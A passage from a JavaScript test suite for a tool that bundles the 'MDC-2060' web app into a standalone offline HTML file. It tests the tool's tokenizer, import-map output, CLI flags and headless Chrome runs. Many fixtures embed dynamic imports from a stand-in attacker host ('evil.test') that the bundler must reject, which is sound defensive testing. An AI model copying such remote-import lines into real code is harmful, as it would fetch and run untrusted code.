        "export const obj = { x: 1 } / 2;",
        'function declFn() {} /"/.test(a);',
        "export const exprFn = function() {} / 2;",
        'class DeclClass {} /"/.test(a);',
        "export const exprClass = class {} / 2;",
        "export const arrowFn = () => {}",
        '/"/.test(a);',
      ].join("\n") + "\n",
    });
    const controlFlowOkRes = await buildStandaloneHtml({rootDir: rootControlFlowOk, write: false});
    assert.equal(controlFlowOkRes.status, "STANDALONE_HTML_CHECK_PASS");
    assert.equal(controlFlowOkRes.modulesBundled, 20);

    const controlFlowRejectCases = [
      [
        "if-paren-import-meta",
        'const a = "x"; if (true) /"/.test(a); export const u = import.meta.url; if (true) /"/.test(a);\n',
        /Unsupported runtime import\.meta/,
      ],
      [
        "block-brace-import-meta",
        'const a = "x"; { const k = 1; } /"/.test(a); export const u = import.meta.url; { const m = 2; } /"/.test(a);\n',
        /Unsupported runtime import\.meta/,
      ],
      [
        "if-paren-ext-import",
        'const a = "x"; if (true) /"/.test(a); export const p = import("https://evil.test/x.mjs"); if (true) /"/.test(a);\n',
        /Unsupported bare\/external specifier/,
      ],
      [
        "unescaped-lf-string",
        'export const s = "line1\nline2";\n',
        /Unterminated string literal/,
      ],
      [
        "unescaped-cr-string",
        "export const s = 'line1\rline2';\n",
        /Unterminated string literal/,
      ],
    ];
    for (const [slug, appSource, expectedRe] of controlFlowRejectCases) {
      const rootCfRej = path.join(tmpBase, `control-flow-reject-${slug}`);
      await createMinimalBundleFixture(rootCfRej, {minModules: 20, appSource});
      await assert.rejects(
        () => buildStandaloneHtml({rootDir: rootCfRej, write: false}),
        expectedRe,
        `Expected fail-closed rejection for control-flow/string case: ${slug}`,
      );
    }
    assert.throws(
      () => tokenizeModule('const s = "broken\nline";'),
      /SyntaxError|Unterminated string literal/,
    );

    // 14. DEFECT-I4-1: Exact ES ImportClause & export { ... } grammar (zero greedy static-import scanning)
    const staticImportRejectCases = [
      [
        "obj-prop-ext-dyn",
        'const o = { import: 1 }\nexport const p = import("https://evil.test/x.mjs")\nimport { dep } from "./dep.mjs"\nexport const out = [o, dep];\n',
        /Unsupported bare\/external specifier/,
      ],
      [
        "obj-val-ext-dyn",
        'export const o = { import: import("https://evil.test/x.mjs") }\nexport { dep } from "./dep.mjs"\n',
        /Unsupported bare\/external specifier/,
      ],
      [
        "obj-fn-block-ext-dyn",
        'const o = { import: 1 }\nfunction f() { const a = 1; return import("https://evil.test/x.mjs"); }\nimport { dep } from "./dep.mjs"\nexport const out = [o, f, dep];\n',
        /Unsupported bare\/external specifier/,
      ],
      [
        "class-field-ext-dyn",
        'class C { import = 1 }\nexport const p = import("https://evil.test/x.mjs")\nexport { dep } from "./dep.mjs"\nexport const K = C;\n',
        /Unsupported bare\/external specifier/,
      ],
      [
        "class-uninit-field-ext-dyn",
        'class C {\n  import\n  m() { return import("https://evil.test/x.mjs"); }\n}\nimport { dep } from "./dep.mjs"\nexport const out = [C, dep];\n',
        /Unsupported bare\/external specifier/,
      ],
      [
        "destructuring-ext-dyn",
        'const { import: imp } = { import: 1 }\nexport const p = import("https://evil.test/x.mjs")\nexport { dep } from "./dep.mjs"\nexport const out = imp;\n',
        /Unsupported bare\/external specifier/,
      ],
      [
        "export-as-import-ext-dyn",
        'const x = 1\nexport { x as import }\nexport const p = import("https://evil.test/x.mjs")\nimport { dep } from "./dep.mjs"\nexport const out = dep;\n',
        /Unsupported bare\/external specifier/,
      ],
      [
        "obj-prop-side-effect-ext",
        'const o = { import: 1 }\nimport "https://evil.test/x.mjs"\nexport { dep } from "./dep.mjs"\nexport const out = o;\n',
        /Unsupported bare\/external specifier/,
      ],
      [
        "obj-prop-nonstatic-tpl",
        'const o = { import: 1 }\nexport const p = import(`https://evil.test/x.mjs`)\nexport { dep } from "./dep.mjs"\nexport const out = o;\n',
        /Unsupported non-static dynamic import\(\) specifier/,
      ],
      [
        "obj-prop-nonstatic-var",
        'const u = "https://evil.test/x.mjs";\nconst o = { import: 1 }\nexport const p = import(u)\nexport { dep } from "./dep.mjs"\nexport const out = o;\n',
        /Unsupported non-static dynamic import\(\) specifier/,
      ],
    ];
    for (const [slug, appSource, expectedRe] of staticImportRejectCases) {
      const rootSiRej = path.join(tmpBase, `i4-1-reject-${slug}`);
      await createMinimalBundleFixture(rootSiRej, {
        minModules: 20,
        appSource,
        extraFiles: [{rel: "web/mdc2060/dep.mjs", content: "export const dep = 1;\n"}],
      });
      await assert.rejects(
        () => buildStandaloneHtml({rootDir: rootSiRej, write: false}),
        expectedRe,
        `Expected fail-closed rejection for DEFECT-I4-1 case: ${slug}`,
      );
    }

    const rootI41Ok = path.join(tmpBase, "i4-1-valid-all-forms");
    await createMinimalBundleFixture(rootI41Ok, {
      minModules: 20,
      appSource: [
        'const cfg = { import: true }',
        'export const p = import("./dep2.mjs")',
        'import { dep } from "./dep.mjs";',
        'import from from "./dep.mjs";',
        'import * as ns from "./dep.mjs";',
        'import def1, * as ns2 from "./dep.mjs";',
        'import def2, { dep as depAlias } from "./dep.mjs";',
        'export * as "str-ns" from "./dep2.mjs";',
        'export class FieldEdge { import\n  "foo"() { return 1; } }',
        'export const out = [cfg, dep, from, ns, def1, ns2, def2, depAlias];',
      ].join("\n") + "\n",
      extraFiles: [
        {rel: "web/mdc2060/dep.mjs", content: "export default 1;\nexport const dep = 11;\n"},
        {rel: "web/mdc2060/dep2.mjs", content: "export const dep2 = 22;\n"},
      ],
    });
    const i41OkRes = await buildStandaloneHtml({rootDir: rootI41Ok, write: false});
    assert.equal(i41OkRes.status, "STANDALONE_HTML_CHECK_PASS");
    assert.equal(i41OkRes.modulesBundled, 22);
    const i41Map = JSON.parse(i41OkRes.html.match(/<script type="importmap">([\s\S]*?)<\/script>/)[1]);
    assert.ok(Object.hasOwn(i41Map.imports, "mdc2060://web/mdc2060/dep.mjs"));
    assert.ok(Object.hasOwn(i41Map.imports, "mdc2060://web/mdc2060/dep2.mjs"));
    const i41DecodedApp = Buffer.from(
      i41Map.imports["mdc2060://web/mdc2060/app.mjs"].slice("data:text/javascript;charset=utf-8;base64,".length),
      "base64",
    ).toString("utf8");
    assert.ok(i41DecodedApp.includes('export const p = import("mdc2060://web/mdc2060/dep2.mjs")'));
    assert.ok(i41DecodedApp.includes('import from from "mdc2060://web/mdc2060/dep.mjs";'));
    assert.ok(i41DecodedApp.includes('export * as "str-ns" from "mdc2060://web/mdc2060/dep2.mjs";'));

    // 15. DEFECT-I4-2: Contextual keyword "of" strictly gated to for (...) / for await (...) headers
    const rootOfOk = path.join(tmpBase, "i4-2-of-valid");
    await createMinimalBundleFixture(rootOfOk, {
      minModules: 20,
      appSource: [
        "const of = 10;",
        "export const half = of / 2;",
        'for (const x of /a/.exec("a")) {}',
        "for (const x of { [Symbol.iterator]() { return { next: () => ({ done: true }) }; } }) {}",
        "for (let of = 10; of / 2 > 1; of--) {}",
        'for (const of of /a/.exec("a")) {}',
        "for (const x of of / 2 ? [1] : [2]) {}",
        "for (const x in of / 2 ? { a: 1 } : { b: 2 }) {}",
        'export async function runAwait() { for await (const x of /a/.exec("a")) {} }',
      ].join("\n") + "\n",
    });
    const ofOkRes = await buildStandaloneHtml({rootDir: rootOfOk, write: false});
    assert.equal(ofOkRes.status, "STANDALONE_HTML_CHECK_PASS");
    assert.equal(ofOkRes.modulesBundled, 20);

    const ofRejectCases = [
      [
        "of-div-import-meta",
        "const of = 10; export const r = (of / 2, import.meta.url, 4 / 2);\n",
        /Unsupported runtime import\.meta/,
      ],
      [
        "of-div-ext-import",
        'const of = 10; export const p = (of / 2, import("bare-external-pkg"), 4 / 2);\n',
        /Unsupported bare\/external specifier/,
      ],
      [
        "of-div-nonstatic-import",
        'const of = 10; const u = "https://evil.test/x.mjs"; export const p = (of / 2, import(u), 4 / 2);\n',
        /Unsupported non-static dynamic import\(\) specifier/,
      ],
      [
        "of-asi-block-import-meta",
        'const of = 1; const a = "x";\nconst b = of\n{ const k = 1; } /"/.test(a); export const u = import.meta.url; { const m = 2; } /"/.test(a);\n',
        /Unsupported runtime import\.meta/,
      ],
      [
        "for-of-second-of-import-meta",
        "const of = 10; for (const x of of / 2 + import.meta.url + 4 / 2) {}\n",
        /Unsupported runtime import\.meta/,
      ],
      [
        "for-cstyle-of-import-meta",
        "for (let of = 10; (of / 2, import.meta.url, 4 / 2); ) {}\n",
        /Unsupported runtime import\.meta/,
      ],
    ];
    for (const [slug, appSource, expectedRe] of ofRejectCases) {
      const rootOfRej = path.join(tmpBase, `i4-2-reject-${slug}`);
      await createMinimalBundleFixture(rootOfRej, {minModules: 20, appSource});
      await assert.rejects(
        () => buildStandaloneHtml({rootDir: rootOfRej, write: false}),
        expectedRe,
        `Expected fail-closed rejection for DEFECT-I4-2 case: ${slug}`,
      );
    }

    // 16. DEFECT-I4-3: isMemberHeaderPosition in class bodies (ASI fields ending in ], ), ++ & binary * rejection)
    const rootClassOk = path.join(tmpBase, "i4-3-class-valid");
    await createMinimalBundleFixture(rootClassOk, {
      minModules: 20,
      appSource: [
        "const fn = () => 1;",
        'const k = "key";',
        "let n = 0;",
        "const async = 1;",
        "export class C1 {\n  a = []\n  import(x) { return x; }\n}",
        "export class C2 {\n  a = fn()\n  import(x) { return x; }\n}",
        "export class C3 {\n  a = (1 + 2)\n  import(x) { return x; }\n}",
        "export class C4 {\n  [k]\n  import(x) { return x; }\n}",
        "export class C5 {\n  a = n++\n  import(x) { return x; }\n}",
        "export class C6 {\n  a = []\n  static import(x) { return x; }\n}",
        "export class C7 {\n  a = async\n  import(x) { return x; }\n}",
        "export class C8 {\n  x\n  *import(y) { yield y; }\n}",
      ].join("\n") + "\n",
    });
    const classOkRes = await buildStandaloneHtml({rootDir: rootClassOk, write: false});
    assert.equal(classOkRes.status, "STANDALONE_HTML_CHECK_PASS");
    assert.equal(classOkRes.modulesBundled, 20);

    const classRejectCases = [
      [
        "mul-ext-import",
        'export class C { x = 1 * import("https://evil.test/x.mjs"); }\n',
        /Unsupported bare\/external specifier/,
      ],
      [
        "mul-nonstatic-import",
        'const urlVar = "./dep.mjs";\nexport class C { x = 1 * import(urlVar); }\n',
        /Unsupported non-static dynamic import\(\) specifier/,
      ],
      [
        "obj-mul-ext-import",
        'export class C { x = { a: 1 } * import("https://evil.test/x.mjs"); }\n',
        /Unsupported bare\/external specifier/,
      ],
      [
        "async-mul-ext-import",
        'const async = 1;\nexport class C { x = 1 + async * import("https://evil.test/x.mjs"); }\n',
        /Unsupported bare\/external specifier/,
      ],
    ];
    for (const [slug, appSource, expectedRe] of classRejectCases) {
      const rootClsRej = path.join(tmpBase, `i4-3-reject-${slug}`);
      await createMinimalBundleFixture(rootClsRej, {minModules: 20, appSource});
      await assert.rejects(
        () => buildStandaloneHtml({rootDir: rootClsRej, write: false}),
        expectedRe,
        `Expected fail-closed rejection for DEFECT-I4-3 case: ${slug}`,
      );
    }

    // 17. DEFECT-I4-4: Complete ECMA-262 ASI statement-end canStartRegexAfter handling
    const rootAsiOk = path.join(tmpBase, "i4-4-asi-valid");
    await createMinimalBundleFixture(rootAsiOk, {
      minModules: 20,
      appSource: [
        'import "./dep.mjs"\n/"/.test("x");',
        'import { dep } from "./dep.mjs"\n/"/.test("x");',
        'export { dep } from "./dep.mjs"\n/"/.test("x");',
        'debugger\n/"/.test("x");',
        'while (true) { break\n/"/.test("x"); }',
        'lbl: while (true) { break lbl\n/"/.test("x"); }',
        'while (false) { continue\n/"/.test("x"); }',
        'lbl2: while (false) { continue lbl2\n/"/.test("x"); }',
        'let x\n/"/.test("a");',
        'var y\n/"/.test("a");',
        'export let z\n/"/.test("a");',
        'var a = 1, b\n/"/.test("a");',
        "var initDiv = 1\n/ 2;",
        'const strDiv = "hello"\n/ 2;',
        "let commaTarget = 2; function noop() {}\nvar afterAsi = 1\nnoop(), commaTarget\n/ 2;",
        "export const keep = [dep, x, y, a, b, initDiv, strDiv, afterAsi];",
      ].join("\n") + "\n",
      extraFiles: [{rel: "web/mdc2060/dep.mjs", content: "export const dep = 7;\n"}],
    });
    const asiOkRes = await buildStandaloneHtml({rootDir: rootAsiOk, write: false});
    assert.equal(asiOkRes.status, "STANDALONE_HTML_CHECK_PASS");
    assert.equal(asiOkRes.modulesBundled, 21);

    const asiRejectCases = [
      [
        "import-side-effect-imeta",
        'import "./dep.mjs"\n/"/.test("x"); export const u = import.meta.url; const v = /"/.test("x");\n',
        /Unsupported runtime import\.meta/,
      ],
      [
        "import-side-effect-ext",
        'import "./dep.mjs"\n/"/.test("x"); export const p = import("https://evil.test/x.mjs"); const v = /"/.test("x");\n',
        /Unsupported bare\/external specifier/,
      ],
      [
        "import-named-imeta",
        'import { dep } from "./dep.mjs"\n/"/.test("x"); export const u = import.meta.url; const v = /"/.test("x");\n',
        /Unsupported runtime import\.meta/,
      ],
      [
        "export-from-ext",
        'export { dep } from "./dep.mjs"\n/"/.test("x"); export const p = import("https://evil.test/x.mjs"); const v = /"/.test("x");\n',
        /Unsupported bare\/external specifier/,
      ],
      [
        "debugger-imeta",
        'debugger\n/"/.test("x"); export const u = import.meta.url; const v = /"/.test("x");\n',
        /Unsupported runtime import\.meta/,
      ],
      [
        "break-ext",
        'while (true) { break\n/"/.test("x"); const p = import("https://evil.test/x.mjs"); const v = /"/.test("x"); }\n',
        /Unsupported bare\/external specifier/,
      ],
      [
        "break-lbl-imeta",
        'lbl: while (true) { break lbl\n/"/.test("x"); const u = import.meta.url; const v = /"/.test("x"); }\n',
        /Unsupported runtime import\.meta/,
      ],
      [
        "let-imeta",
        'let x\n/"/.test("a"); export const u = import.meta.url; const v = /"/.test("a");\n',
        /Unsupported runtime import\.meta/,
      ],
      [
        "var-multi-ext",
        'var a = 1, b\n/"/.test("a"); export const p = import("https://evil.test/x.mjs"); const v = /"/.test("a");\n',
        /Unsupported bare\/external specifier/,
      ],
      [
        "export-let-imeta",
        'export let x\n/"/.test("a"); export const u = import.meta.url; const v = /"/.test("a");\n',
        /Unsupported runtime import\.meta/,
      ],
      [
        "var-asi-comma-div-imeta",
        "let b = 2; function noop() {}\nvar a = 1\nnoop(), b\n/ 2, import.meta.url, 4 / 2;\n",
        /Unsupported runtime import\.meta/,
      ],
    ];
    for (const [slug, appSource, expectedRe] of asiRejectCases) {
      const rootAsiRej = path.join(tmpBase, `i4-4-reject-${slug}`);
      await createMinimalBundleFixture(rootAsiRej, {
        minModules: 20,
        appSource,
        extraFiles: [{rel: "web/mdc2060/dep.mjs", content: "export const dep = 7;\n"}],
      });
      await assert.rejects(
        () => buildStandaloneHtml({rootDir: rootAsiRej, write: false}),
        expectedRe,
        `Expected fail-closed rejection for DEFECT-I4-4 case: ${slug}`,
      );
    }

    // Verify tokenizeModule preserves strict public {type, value, start, end} token shape
    for (const tok of tokenizeModule('import "./dep.mjs"\nfor (const x of /a/.exec("a")) { class C { import(y) { return y; } } }\n')) {
      assert.deepEqual(Object.keys(tok), ["type", "value", "start", "end"]);
    }
  } finally {
    await rm(tmpBase, {recursive: true, force: true, maxRetries: 5, retryDelay: 100});
  }
});

test("build_mdc2060_standalone.mjs CLI supports --check (zero writes, deterministic SHA-256), --out, unknown-flag rejection, and builds dist/MDC-2060-Standalone.html", async () => {
  const tmpOutDir = await mkdtemp(path.join(os.tmpdir(), "mdc2060-cli-out-"));
  try {
    // --check with --out must perform ZERO writes and produce deterministic SHA-256
    const neverCreated = path.join(tmpOutDir, "should-not-exist.html");
    const checkRun1 = spawnSync(
      process.execPath,
      ["tools/build_mdc2060_standalone.mjs", "--check", "--out", neverCreated],
      {cwd: ROOT, encoding: "utf8", windowsHide: true},
    );
    assert.equal(checkRun1.status, 0, checkRun1.stderr || checkRun1.stdout);
    assert.equal(existsSync(neverCreated), false, "--check must not create the output file");
    const checkJson1 = JSON.parse(checkRun1.stdout.trim());
    assert.equal(checkJson1.status, "STANDALONE_HTML_CHECK_PASS");
    assert.ok(checkJson1.modulesBundled >= 20, `expected >= 20 modules, got ${checkJson1.modulesBundled}`);

    const checkRun2 = spawnSync(
      process.execPath,
      ["tools/build_mdc2060_standalone.mjs", "--check"],
      {cwd: ROOT, encoding: "utf8", windowsHide: true},
    );
    assert.equal(checkRun2.status, 0, checkRun2.stderr || checkRun2.stdout);
    const checkJson2 = JSON.parse(checkRun2.stdout.trim());
    assert.equal(checkJson2.sha256, checkJson1.sha256);
    assert.equal(checkJson2.bytes, checkJson1.bytes);
    assert.equal(checkJson2.modulesBundled, checkJson1.modulesBundled);

    // Custom --out <path> and --out=<path>
    const customOut1 = path.join(tmpOutDir, "custom-1.html");
    const customRun1 = spawnSync(
      process.execPath,
      ["tools/build_mdc2060_standalone.mjs", "--out", customOut1],
      {cwd: ROOT, encoding: "utf8", windowsHide: true},
    );
    assert.equal(customRun1.status, 0, customRun1.stderr || customRun1.stdout);
    const customJson1 = JSON.parse(customRun1.stdout.trim());
    assert.equal(customJson1.status, "STANDALONE_HTML_BUILT");
    assert.equal(customJson1.sha256, checkJson1.sha256);
    assert.equal(
      createHash("sha256").update(await readFile(customOut1)).digest("hex"),
      checkJson1.sha256,
    );

    const customOut2 = path.join(tmpOutDir, "custom-2.html");
    const customRun2 = spawnSync(
      process.execPath,
      ["tools/build_mdc2060_standalone.mjs", `--out=${customOut2}`],
      {cwd: ROOT, encoding: "utf8", windowsHide: true},
    );
    assert.equal(customRun2.status, 0, customRun2.stderr || customRun2.stdout);
    assert.equal(
      createHash("sha256").update(await readFile(customOut2)).digest("hex"),
      checkJson1.sha256,
    );

    // Unknown flag & missing --out value rejected non-zero
    for (const badArgs of [["--invalid-flag"], ["--out"], ["--out="]]) {
      const badRun = spawnSync(
        process.execPath,
        ["tools/build_mdc2060_standalone.mjs", ...badArgs],
        {cwd: ROOT, encoding: "utf8", windowsHide: true},
      );
      assert.notEqual(badRun.status, 0, `expected non-zero exit for args: ${badArgs.join(" ")}`);
      assert.ok(badRun.stderr.trim().length > 0);
    }

    // Default build writes dist/MDC-2060-Standalone.html
    const buildRun = spawnSync(
      process.execPath,
      ["tools/build_mdc2060_standalone.mjs"],
      {cwd: ROOT, encoding: "utf8", windowsHide: true},
    );
    assert.equal(buildRun.status, 0, buildRun.stderr || buildRun.stdout);
    const buildJson = JSON.parse(buildRun.stdout.trim());
    assert.equal(buildJson.status, "STANDALONE_HTML_BUILT");
    assert.equal(buildJson.output, "dist/MDC-2060-Standalone.html");
    assert.equal(buildJson.modulesBundled, checkJson1.modulesBundled);
    assert.equal(buildJson.sha256, checkJson1.sha256);

    const distPath = path.join(ROOT, "dist", "MDC-2060-Standalone.html");
    const htmlBytes = await readFile(distPath);
    assert.equal(htmlBytes.length, buildJson.bytes);
    assert.equal(createHash("sha256").update(htmlBytes).digest("hex"), buildJson.sha256);

    const html = htmlBytes.toString("utf8");
    assert.match(html, /^<!doctype html>/i);
    assert.match(
      html,
      /<meta http-equiv="Content-Security-Policy" content="[^"]*connect-src 'none'[^"]*">/,
    );
    assert.match(html, /<link rel="icon" type="image\/svg\+xml" href="data:image\/svg\+xml;base64,/);
    assert.match(html, /<style>[\s\S]*<\/style>/);
    assert.doesNotMatch(html, /(?:href|src)\s*=\s*["']\/(?:web|src)\//i);

    const importMapPos = html.indexOf("<script type=\"importmap\">");
    const firstModPos = html.indexOf("<script type=\"module\">");
    assert.ok(importMapPos !== -1 && firstModPos !== -1 && importMapPos < firstModPos);

    const importMapMatch = html.match(/<script type="importmap">([\s\S]*?)<\/script>/);
    assert.ok(importMapMatch, "Standalone HTML must include <script type=\"importmap\">");
    const importMap = JSON.parse(importMapMatch[1]);
    const entries = Object.entries(importMap.imports);
    assert.equal(entries.length, buildJson.modulesBundled);
    assert.ok(entries.length >= 20);

    for (const [spec, dataUrl] of entries) {
      assert.ok(spec.startsWith("mdc2060://"), `unexpected specifier key: ${spec}`);
      assert.ok(
        dataUrl.startsWith("data:text/javascript;charset=utf-8;base64,"),
        `expected base64 JS data URL for ${spec}`,
      );
      const b64 = dataUrl.slice("data:text/javascript;charset=utf-8;base64,".length);
      const decoded = Buffer.from(b64, "base64").toString("utf8");
      for (const innerSpec of findModuleSpecifiers(decoded)) {
        assert.ok(
          innerSpec.value.startsWith("mdc2060://") && Object.hasOwn(importMap.imports, innerSpec.value),
          `unresolved specifier ${innerSpec.value} inside bundled ${spec}`,
        );
      }
    }

    // Programmatic API accepts outPath alias and write: false
    const memRes = await buildStandaloneHtml({
      rootDir: ROOT,
      outPath: path.join(tmpOutDir, "unused.html"),
      write: false,
    });
    assert.equal(memRes.status, "STANDALONE_HTML_CHECK_PASS");
    assert.equal(memRes.sha256, buildJson.sha256);
    assert.equal(existsSync(path.join(tmpOutDir, "unused.html")), false);
  } finally {
    await rm(tmpOutDir, {recursive: true, force: true, maxRetries: 5, retryDelay: 100});
  }
});

test("Real Headless Chrome loads file:///.../dist/MDC-2060-Standalone.html offline with zero errors and passes full radar UI & replay flow", {timeout: 45000}, async (t) => {
  const browserBin = findChromiumBinary();
  if (!browserBin) {
    t.skip("No local Chrome/Edge binary found for headless file:// CDP verification");
    return;
  }

  const distPath = path.join(ROOT, "dist", "MDC-2060-Standalone.html");
  if (!existsSync(distPath)) {
    await buildStandaloneHtml({rootDir: ROOT, write: true});
  }

  const fileUrl = pathToFileURL(distPath).href;
  const run = await runHeadlessMdc2060Scenario(fileUrl, browserBin, {checkNetwork: false});
  assertChromeMdc2060Run(run, "file:", "file:// standalone");
});

test("Real Headless Chrome loads live http://127.0.0.1:<port>/mdc2060 with zero errors and passes full radar UI & replay flow", {timeout: 45000}, async (t) => {
  const browserBin = findChromiumBinary();
  if (!browserBin) {
    t.skip("No local Chrome/Edge binary found for headless /mdc2060 CDP verification");
    return;
  }

  const srv = await startLocalServer();
  try {
    const run = await runHeadlessMdc2060Scenario(`${srv.origin}/mdc2060`, browserBin, {checkNetwork: true});
    assertChromeMdc2060Run(run, "http:", "http://localhost/mdc2060");
  } finally {
    await srv.close();
  }
});
